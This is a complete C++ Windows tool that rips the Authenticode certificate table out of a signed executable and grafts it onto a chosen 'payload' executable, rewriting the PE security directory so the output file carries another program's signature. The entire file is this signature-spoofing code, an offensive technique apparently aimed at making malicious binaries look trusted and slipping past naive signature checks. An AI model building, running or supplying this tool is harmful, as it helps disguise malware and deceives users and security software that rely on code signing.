#include <fstream>
#include <iostream>
#include <windows.h>
#include <vector>
#include <stdexcept>
#include <string>
#include <memory>

#pragma warning(disable : 4996)

std::vector<BYTE> MapFileToMemory(const std::string& filename)
{
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        throw std::runtime_error("File open error");
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(fileSize);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), fileSize)) {
        std::cerr << "Failed to read file: " << filename << std::endl;
        throw std::runtime_error("File read error");
    }

    return buffer;
}

std::vector<BYTE> rippedCert(const std::string& fromWhere, LONGLONG& certSize)
{
    auto signedPeData = MapFileToMemory(fromWhere);
    PIMAGE_NT_HEADERS ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(signedPeData.data() + reinterpret_cast<PIMAGE_DOS_HEADER>(signedPeData.data())->e_lfanew);

    auto certInfo = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    certSize = certInfo.Size;

    std::vector<BYTE> certData(certSize);
    std::memcpy(certData.data(), signedPeData.data() + certInfo.VirtualAddress, certSize);

    return certData;
}

std::wstring OpenFileDialog()
{
    OPENFILENAME ofn;
    wchar_t szFile[260];

    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = GetConsoleWindow();
    ofn.lpstrFile = szFile;
    ofn.lpstrFile[0] = L'\0';
    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
    ofn.lpstrFilter = nullptr;
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = nullptr;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = nullptr;
    ofn.lpstrTitle = L"Select a file";
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

    if (GetOpenFileName(&ofn) == TRUE)
        return std::wstring(ofn.lpstrFile);

    return L"";
}

std::wstring SaveFileDialog(const std::wstring& filter)
{
    OPENFILENAME ofn;
    wchar_t szFile[260];

    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = GetConsoleWindow();
    ofn.lpstrFile = szFile;
    ofn.lpstrFile[0] = L'\0';
    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
    ofn.lpstrFilter = filter.c_str();
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = nullptr;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = nullptr;
    ofn.lpstrTitle = L"Save as";
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

    if (GetSaveFileName(&ofn) == TRUE)
        return std::wstring(ofn.lpstrFile);

    return L"";
}

int main()
{
    try {
        std::wstring signedPePath = OpenFileDialog();
        if (signedPePath.empty()) {
            std::wcerr << L"No signed PE file selected." << std::endl;
            return 1;
        }

        std::wstring payloadPePath = OpenFileDialog();
        if (payloadPePath.empty()) {
            std::wcerr << L"No payload PE file selected." << std::endl;
            return 1;
        }

        std::wstring outputPath = SaveFileDialog(L"Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0");
        if (outputPath.empty()) {
            std::wcerr << L"No output file selected." << std::endl;
            return 1;
        }

        LONGLONG certSize;
        auto certData = rippedCert(std::string(signedPePath.begin(), signedPePath.end()), certSize);

        auto payloadPeData = MapFileToMemory(std::string(payloadPePath.begin(), payloadPePath.end()));

        std::vector<BYTE> finalPeData(payloadPeData.size() + certData.size());
        std::memcpy(finalPeData.data(), payloadPeData.data(), payloadPeData.size());

        PIMAGE_NT_HEADERS ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(finalPeData.data() + reinterpret_cast<PIMAGE_DOS_HEADER>(finalPeData.data())->e_lfanew);
        ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadPeData.size();
        ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;
        std::memcpy(finalPeData.data() + payloadPeData.size(), certData.data(), certData.size());

        std::ofstream outFile(std::string(outputPath.begin(), outputPath.end()), std::ios::binary);
        if (!outFile) {
            std::cerr << "Failed to open output file: " << std::string(outputPath.begin(), outputPath.end()) << std::endl;
            return 1;
        }

        outFile.write(reinterpret_cast<const char*>(finalPeData.data()), finalPeData.size());
        std::cout << "done." << std::endl;
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
